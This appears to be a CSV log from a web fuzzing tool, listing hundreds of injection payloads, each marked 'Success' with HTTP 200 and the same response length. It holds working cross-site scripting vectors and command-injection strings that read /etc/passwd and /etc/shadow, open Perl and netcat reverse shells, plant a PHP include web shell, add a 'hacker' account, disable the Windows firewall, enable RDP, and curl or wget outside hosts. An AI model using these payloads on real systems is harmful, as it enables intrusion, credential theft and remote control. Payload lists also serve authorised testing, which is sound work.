Status,Payload,HTTP Status,Content Length
Success,xXx%5cx5c%5cx22xXx,200,10701
Success,xXx%26%2392%3b%26quot%3bxXx,200,10701
Success,xXx%26%235c%3b%26%2322%3bxXx,200,10701
Success,xXx%26%23x5c%3b%26%23x22%3bxXx,200,10701
Success,%5ce7858785c22785878,200,10701
Success,xXx%5cu005c%5cu0022xXx,200,10701
Success,xXx%5c134%5c042xXx,200,10701
Success,xXx%5c%C0%A2xXx,200,10701
Success,xXx%5cu565c%5cu5622xXx,200,10701
Success,xXx%5c%C0%A2xXx,200,10701
Success,xXx%5c%5c%5c%22xXx,200,10701
Success,xXx%255c%255c%255c%2522xXx,200,10701
Success,xXx%25%5c%25%5c%25%5c%25%22xXx,200,10701
Success,xXx%5cx5c%5cx5c%5cx5c%5cx22xXx,200,10701
Success,xXx%26%2392%3b%26%2392%3b%26%2392%3b%26quot%3bxXx,200,10701
Success,xXx%26%235c%3b%26%235c%3b%26%235c%3b%26%2322%3bxXx,200,10701
Success,xXx%26%23x5c%3b%26%23x5c%3b%26%23x5c%3b%26%23x22%3bxXx,200,10701
Success,eFh4XFxcInhYeA%3D%3D,200,10701
Success,%5ce7858785c5c5c22785878,200,10701
Success,xXx%5cu005c%5cu005c%5cu005c%5cu0022xXx,200,10701
Success,xXx%5c134%5c134%5c134%5c042xXx,200,10701
Success,xXx%5c%5c%5c%C0%A2xXx,200,10701
Success,xXx%5cu565c%5cu565c%5cu565c%5cu5622xXx,200,10701
Success,"<a href=""javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;""><button>",200,10701
Success,"<a href=""jAvAsCrIpT&colon;alert&lpar;1&rpar;"">X</a>",200,10701
Success,<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>,200,10701
Success,<%<!--'%><script>alert(1);</script -->,200,10701
Success,<iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ?,200,10701
Success,<svg contentScriptType=text/vbs><script>MsgBox+1,200,10701
Success,<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe,200,10701
Success,"'';!--""<XSS>=&{()}",200,10701
Success,SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,200,10701
Success,<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,200,10701
Success,<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,200,10701
Success,"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">",200,10701
Success,"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">",200,10701
Success,"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">",200,10701
Success,"<IMG SRC="" &#14;  javascript:alert('XSS');"">",200,10701
Success,"\"";alert('XSS');//",200,10701
Success,"<BR SIZE=""&{alert('XSS')}"">",200,10701
Success,"<DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))"">",200,10701
Success,"exp/*<XSS STYLE='no\xss:noxss(""*//*"");",200,10701
Success,"<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC=""javas<![CDATA[cript:alert('XSS');"">",200,10701
Success,"<!--#exec cmd=""/bin/echo '<SCRIPT SRC'""--><!--#exec cmd=""/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'""-->",200,10701
Success,<? echo('<SCR)';,200,10701
Success,<A href=javas%26#99;ript:alert(1)>click,200,10701
Success,"<div id=""39""><!-- up to Opera 11.52, FF 3.6.28 -->",200,10701
Success,"<!-- IE9+, FF4+, Opera 11.60+, Safari 4.0.4+, GC7+  -->",200,10701
Success,"<div id=""43""><?xml version=""1.0"" standalone=""no""?>",200,10701
Success,"<style type=""text/css"">",200,10701
Success,"@font-face {font-family: y; src: url(""font.svg#x"") format(""svg"");} body {font: 100px ""y"";}",200,10701
Success,<body>Hello</body>,200,10701
Success,"</html>//[""'`-->]]>]</div>",200,10701
Success,"<div id=""53""><xml id=""xss"" src=""test.htc""></xml>",200,10701
Success,"<div id=""61""><div  style=""\63&#9\06f&#10\0006c&#12\00006F&#13\R:\000072 Ed;color\0\bla:yellow\0\bla;col\0\00 \&#xA0or:blue;"">XXX</div>//[""'`-->]]>]</div>",200,10701
Success,"<div id=""62""><!-- IE 6-8 -->",200,10701
Success,<!-- IE 6-9 -->,200,10701
Success,"<div id=""66""><?xml version=""1.0""?>",200,10701
Success,"<root/>//[""'`-->]]>]</div>",200,10701
Success,"<div id=""67""><!DOCTYPE x [",200,10701
Success,"    <!ATTLIST img xmlns CDATA ""http://www.w3.org/1999/xhtml"" src CDATA ""xx:x""",200,10701
Success," onerror CDATA ""alert(67)""",200,10701
Success," onload CDATA ""alert(2)"">",200,10701
Success,"]><img />//[""'`-->]]>]</div>",200,10701
Success,"<div id=""68""><doc xmlns:xlink=""http://www.w3.org/1999/xlink"" xmlns:html=""http://www.w3.org/1999/xhtml"">",200,10701
Success,"</doc>//[""'`-->]]>]</div>",200,10701
Success,"<div id=""83""><x:template xmlns:x=""http://www.wapforum.org/2001/wml""  x:ontimer=""$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(83)""><x:timer value=""1""/></x:template>//[""'`-->]]>]</div>",200,10701
Success,"<div id=""84""><x xmlns:ev=""http://www.w3.org/2001/xml-events"" ev:event=""load"" ev:handler=""javascript:alert(84)//#x""/>//[""'`-->]]>]</div><div id=""85""><x xmlns:ev=""http://www.w3.org/2001/xml-events"" ev:event=""load"" ev:handler=""test.evt#x""/>//[""'`-->]]>]</div><div id=""86""><body oninput=alert(86)><input autofocus>//[""'`-->]]>]</div>",200,10701
Success,"<div id=""87""><svg xmlns=""http://www.w3.org/2000/svg"">",200,10701
Success,"</svg>//[""'`-->]]>]</div>",200,10701
Success,"<div id=""88""><svg xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"">",200,10701
Success,"<foreignObject xlink:href=""data:text/xml,%3Cscript xmlns='http://www.w3.org/1999/xhtml'%3Ealert(88)%3C/script%3E""/>",200,10701
Success,"</svg>//[""'`-->]]>]</div>",200,10701
Success,"<div id=""89""><svg xmlns=""http://www.w3.org/2000/svg"">",200,10701
Success,"</svg>//[""'`-->]]>]</div>",200,10701
Success,"<div id=""90""><!-- Up to Opera 10.63 -->",200,10701
Success,"<div id=""91"">[A]",200,10701
Success,"<! foo=""[[[x]]""><x foo=""]foo><script>alert(91)</script>"">",200,10701
Success,"<div id=""94""><svg xmlns=""http://www.w3.org/2000/svg"">",200,10701
Success,"</svg>//[""'`-->]]>]</div>",200,10701
Success,"<div id=""95""><svg xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"">",200,10701
Success,"PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D""/>",200,10701
Success,"</svg>//[""'`-->]]>]</div>",200,10701
Success,"<div id=""97""><!-- IE 5-9 -->",200,10701
Success,<!-- IE 10 in IE5-9 Standards mode -->,200,10701
Success,"<div id=""98""><div id=d><div style=""font-family:'sans\27\2F\2A\22\2A\2F\3B color\3Ared\3B'"">X</div></div>",200,10701
Success,"<div id=""99"">XXX<style>",200,10701
Success,*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */,200,10701
Success,<!--,200,10701
Success,--><!--*{color:red}   /* all UA */,200,10701
Success,*{background:url(xx:x //**/\red/*)} /* IE 6-7 Standards mode */,200,10701
Success,"</style>//[""'`-->]]>]</div>",200,10701
Success,"<div id=""104""><svg xmlns=""http://www.w3.org/2000/svg"" id=""foo"">",200,10701
Success,"</svg>//[""'`-->]]>]</div>",200,10701
Success,"<div id=""108""><!-- IE 5-8 standards mode -->",200,10701
Success,<!-- IE 5-9 standards mode -->,200,10701
Success,"<div id=""109""><svg xmlns=""http://www.w3.org/2000/svg"">",200,10701
Success,"<a id=""x""><rect fill=""white"" width=""1000"" height=""1000""/></a>",200,10701
Success,"</svg>//[""'`-->]]>]</div>",200,10701
Success,"<div id=""110""><svg xmlns=""http://www.w3.org/2000/svg"">",200,10701
Success,"</svg>//[""'`-->]]>]</div>",200,10701
Success,"<div id=""113""><div id=""x"">XXX</div>",200,10701
Success,<style>,200,10701
Success,#x{font-family:foo[bar;color:green;},200,10701
Success,#y];color:red;{,200,10701
Success,"</style>//[""'`-->]]>]</div>",200,10701
Success,"<div id=""116""><div id=""x"">x</div>",200,10701
Success,"<xml:namespace prefix=""t"">",200,10701
Success,"<import namespace=""t"" implementation=""#default#time2"">",200,10701
Success,"<t:set attributeName=""innerHTML"" targetElement=""x"" to=""&lt;img&#11;src=x:x&#11;onerror&#11;=alert(116)&gt;"">//[""'`-->]]>]</div>",200,10701
Success,"</a>//[""'`-->]]>]</div>",200,10701
Success,    <h1>Drop me</h1>,200,10701
Success,</div>,200,10701
Success,"<textarea type=""text"" cols=""50"" rows=""10""></textarea>//[""'`-->]]>]</div>",200,10701
Success,"<div id=""120""><script>",200,10701
Success,function makePopups(){,200,10701
Success,    for (i=1;i<6;i++) {,200,10701
Success,    },200,10701
Success,},200,10701
Success,</script>,200,10701
Success,<body>,200,10701
Success,"<a href=""#"" onclick=""makePopups()"">Spam</a>//[""'`-->]]>]</div>",200,10701
Success,"xmlns:svg=""http://www.w3.org/2000/svg"">",200,10701
Success,<svg:svg>,200,10701
Success,"<svg:mask id=""maskForClickjacking"" maskUnits=""objectBoundingBox"" maskContentUnits=""objectBoundingBox"">",200,10701
Success,"    <svg:rect x=""0.0"" y=""0.0"" width=""0.373"" height=""0.3"" fill=""white""/>",200,10701
Success,"    <svg:circle cx=""0.45"" cy=""0.7"" r=""0.075"" fill=""white""/>",200,10701
Success,</svg:mask>,200,10701
Success,</svg:svg>,200,10701
Success,</body>,200,10701
Success,"</html>//[""'`-->]]>]</div>",200,10701
Success,"<div id=""123""><span class=foo>Some text</span>",200,10701
Success,<script>,200,10701
Success,"$(""a.bar"").click();",200,10701
Success,});,200,10701
Success,});,200,10701
Success,"</script>//[""'`-->]]>]</div>",200,10701
Success,"<div id=""125""><?xml version=""1.0""?>",200,10701
Success,"<?xml-stylesheet type=""text/xml"" href=""#stylesheet""?>",200,10701
Success,<!DOCTYPE doc [,200,10701
Success,<!ATTLIST xsl:stylesheet,200,10701
Success,  id    ID    #REQUIRED>]>,200,10701
Success,"<svg xmlns=""http://www.w3.org/2000/svg"">",200,10701
Success,"    <xsl:stylesheet id=""stylesheet"" version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"">",200,10701
Success,"        <xsl:template match=""/"">",200,10701
Success,        </xsl:template>,200,10701
Success,    </xsl:stylesheet>,200,10701
Success,"    <circle fill=""red"" r=""40""></circle>",200,10701
Success,"</svg>//[""'`-->]]>]</div>",200,10701
Success,"<div id=""126""><object id=""x"" classid=""clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598""></object>",200,10701
Success,"<div id=""127""><svg xmlns=""http://www.w3.org/2000/svg"" id=""x"">",200,10701
Success,"<listener event=""load"" handler=""#y"" xmlns=""http://www.w3.org/2001/xml-events"" observer=""x""/>",200,10701
Success,"</svg>//[""'`-->]]>]</div>",200,10701
Success,"<div id=""129""><svg>",200,10701
Success,echo%20$(rm%20SYCGSY.txt%20>%20SYCGSY.txt),200,10701
Success,cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??,200,10701
Success,&cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??,200,10701
Success,&&cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??,200,10701
Success,|cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??,200,10701
Success,||cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??,200,10701
Success,;cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??,200,10701
Success,%0Acat%20/etc/passwd,200,10701
Success,%0Aid,200,10701
Success,%0a id %0a,200,10701
Success,%0Aid%0A,200,10701
Success,%0a ping -i 30 127.0.0.1 %0a,200,10701
Success,%0A/usr/bin/id,200,10701
Success,%0A/usr/bin/id%0A,200,10701
Success,%20{${phpinfo()}},200,10701
Success,a|id|,200,10701
Success,a;id|,200,10701
Success,a;id;,200,10701
Success,&ls,200,10701
Success,&&ls,200,10701
Success,&&&ls,200,10701
Success,&echo hello there,200,10701
Success,&- -& ls,200,10701
Success,%0Als,200,10701
Success,%0Als,200,10701
Success,%0Auname -a,200,10701
Success,%0Als -la,200,10701
Success,a;id\n,200,10701
Success,cat /etc/hosts,200,10701
Success,cat /etc/passwd,200,10701
Success,| curl http://crowdshield.com/.testing/rce.txt,200,10701
Success,& curl http://crowdshield.com/.testing/rce.txt,200,10701
Success,; curl https://crowdshield.com/.testing/rce_vuln.txt,200,10701
Success,&& curl https://crowdshield.com/.testing/rce_vuln.txt,200,10701
Success,curl https://crowdshield.com/.testing/rce_vuln.txt,200,10701
Success," curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",200,10701
Success,"curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",200,10701
Success,$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),200,10701
Success,& dir,200,10701
Success,&&dir,200,10701
Success,&& dir,200,10701
Success,& dir C:\,200,10701
Success,&& dir C:\,200,10701
Success,dir C:\,200,10701
Success,& dir C:\Documents and Settings\*,200,10701
Success,&& dir C:\Documents and Settings\*,200,10701
Success,dir C:\Documents and Settings\*,200,10701
Success,& dir C:\Users,200,10701
Success,&& dir C:\Users,200,10701
Success,dir C:\Users,200,10701
Success,"& echo ""<?php include($_GET['page']); ?>"" > rfi.php",200,10701
Success,"&& echo ""<?php include($_GET['page']); ?>"" > rfi.php",200,10701
Success,"echo ""<?php include($_GET['page']); ?>"" > rfi.php",200,10701
Success,"& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",200,10701
Success,"&& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",200,10701
Success,"echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",200,10701
Success,exec('ls'),200,10701
Success,exec('pwd'),200,10701
Success,exec('pwd');,200,10701
Success,exec('sleep 5'),200,10701
Success,exec('sleep 5');,200,10701
Success,exec('ls'),200,10701
Success,exec('ls');,200,10701
Success,";{$_GET[""cmd""]}",200,10701
Success,`id`,200,10701
Success,|id,200,10701
Success,| id,200,10701
Success,;id,200,10701
Success,;id|,200,10701
Success,;id;,200,10701
Success,& id,200,10701
Success,&&id,200,10701
Success,;id\n,200,10701
Success,ifconfig,200,10701
Success,& ifconfig,200,10701
Success,&& ifconfig,200,10701
Success,/index.html|id|,200,10701
Success,& ipconfig /all,200,10701
Success,&& ipconfig /all,200,10701
Success,ipconfig /all,200,10701
Success,& ls -l /,200,10701
Success,&& ls -l /,200,10701
Success,ls -l /,200,10701
Success,& ls -laR /etc,200,10701
Success,&& ls -laR /etc,200,10701
Success,& ls -laR /var/www,200,10701
Success,&& ls -laR /var/www,200,10701
Success,& ls -l /etc/,200,10701
Success,&& ls -l /etc/,200,10701
Success,ls -l /etc/,200,10701
Success,ls -lh /etc/,200,10701
Success,& ls -l /home/*,200,10701
Success,&& ls -l /home/*,200,10701
Success,ls -l /home/*,200,10701
Success,& ls -l /tmp,200,10701
Success,&& ls -l /tmp,200,10701
Success,ls -l /tmp,200,10701
Success,& ls -l /var/www/*,200,10701
Success,&& ls -l /var/www/*,200,10701
Success,ls -l /var/www/*,200,10701
Success,"<!--#exec cmd=""/bin/cat /etc/passwd""-->",200,10701
Success,"<!--#exec cmd=""/bin/cat /etc/shadow""-->",200,10701
Success,"<!--#exec cmd=""/usr/bin/id;-->=",200,10701
Success,\n/bin/ls -al\n,200,10701
Success,| nc -lvvp 4444 -e /bin/sh|,200,10701
Success,; nc -lvvp 4444 -e /bin/sh;,200,10701
Success,& nc -lvvp 4444 -e /bin/sh&,200,10701
Success,&& nc -lvvp 4444 -e /bin/sh &,200,10701
Success,nc -lvvp 4444 -e /bin/sh,200,10701
Success,nc -lvvp 4445 -e /bin/sh &,200,10701
Success,nc -lvvp 4446 -e /bin/sh|,200,10701
Success,nc -lvvp 4447 -e /bin/sh;,200,10701
Success,nc -lvvp 4448 -e /bin/sh&,200,10701
Success,\necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n,200,10701
Success,\necho INJECTX\nexit\n\033[2Asleep 5\n,200,10701
Success,\necho INJECTX\nexit\n\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\n,200,10701
Success,| netsh firewall set opmode disable,200,10701
Success,; netsh firewall set opmode disable,200,10701
Success,& netsh firewall set opmode disable,200,10701
Success,&& netsh firewall set opmode disable,200,10701
Success,netsh firewall set opmode disable,200,10701
Success,& netstat -an,200,10701
Success,&& netstat -an,200,10701
Success,netstat -an,200,10701
Success,| net user hacker Password1 /ADD,200,10701
Success,; net user hacker Password1 /ADD,200,10701
Success,& net user hacker Password1 /ADD,200,10701
Success,&& net user hacker Password1 /ADD,200,10701
Success,net user hacker Password1 /ADD,200,10701
Success,| net view,200,10701
Success,; net view,200,10701
Success,& net view,200,10701
Success,&& net view,200,10701
Success,net view,200,10701
Success,\nid|,200,10701
Success,\nid;,200,10701
Success,\nid\n,200,10701
Success,\n/usr/bin/id\n,200,10701
Success,|| phpinfo(),200,10701
Success,| phpinfo(),200,10701
Success, {${phpinfo()}},200,10701
Success,;phpinfo(),200,10701
Success,;phpinfo();//,200,10701
Success,';phpinfo();//,200,10701
Success,{${phpinfo()}},200,10701
Success,& phpinfo(),200,10701
Success,&& phpinfo(),200,10701
Success,phpinfo(),200,10701
Success,phpinfo();,200,10701
Success,"<?php system(""cat /etc/passwd"");?>",200,10701
Success,"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",200,10701
Success,"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj"");?>",200,10701
Success,"<?php system(""echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"");?>",200,10701
Success,"<?php system(""sleep 10"");?>",200,10701
Success,"<?php system(""sleep 5"");?>",200,10701
Success,"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",200,10701
Success,"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?req=jdfj2jc"");?>",200,10701
Success,:phpversion();,200,10701
Success,& ping -i 30 127.0.0.1 &,200,10701
Success,& ping -n 30 127.0.0.1 &,200,10701
Success,;${@print(md5(RCEVulnerable))};,200,10701
Success,"${@print(""RCEVulnerable"")}",200,10701
Success,${@print(system($_SERVER['HTTP_USER_AGENT']))},200,10701
Success,& pwd,200,10701
Success,&& pwd,200,10701
Success,\r,200,10701
Success,"| reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",200,10701
Success,"; reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",200,10701
Success,"& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",200,10701
Success,"&& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",200,10701
Success,"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",200,10701
Success,\r\n,200,10701
Success,; sleep 1,200,10701
Success,& sleep 1,200,10701
Success,&& sleep 1,200,10701
Success,; sleep 10,200,10701
Success,& sleep 10 ,200,10701
Success,&& sleep 10,200,10701
Success,; sleep 15,200,10701
Success,& sleep 15 ,200,10701
Success,&& sleep 15,200,10701
Success,; sleep 5,200,10701
Success,& sleep 5,200,10701
Success,&& sleep 5,200,10701
Success,sleep 5,200,10701
Success,| sysinfo,200,10701
Success,; sysinfo,200,10701
Success,& sysinfo,200,10701
Success,&& sysinfo,200,10701
Success,;system('cat%20/etc/passwd'),200,10701
Success,system('cat config.php');,200,10701
Success,system('cat /etc/passwd');,200,10701
Success,|| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,200,10701
Success,| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,200,10701
Success,; system('curl https://crowdshield.com/.testing/rce_vuln.txt');,200,10701
Success,& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,200,10701
Success,&& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,200,10701
Success,system('curl https://crowdshield.com/.testing/rce_vuln.txt'),200,10701
Success,system('curl https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2wdf'),200,10701
Success,system('curl https://xerosecurity.com/.testing/rce_vuln.txt');,200,10701
Success,& systeminfo,200,10701
Success,&& systeminfo,200,10701
Success,system('ls'),200,10701
Success,system('pwd'),200,10701
Success,system('pwd');,200,10701
Success,|| system('sleep 5');,200,10701
Success,| system('sleep 5');,200,10701
Success,; system('sleep 5');,200,10701
Success,& system('sleep 5');,200,10701
Success,&& system('sleep 5');,200,10701
Success,system('sleep 5'),200,10701
Success,system('sleep 5');,200,10701
Success,system('wget https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2w23'),200,10701
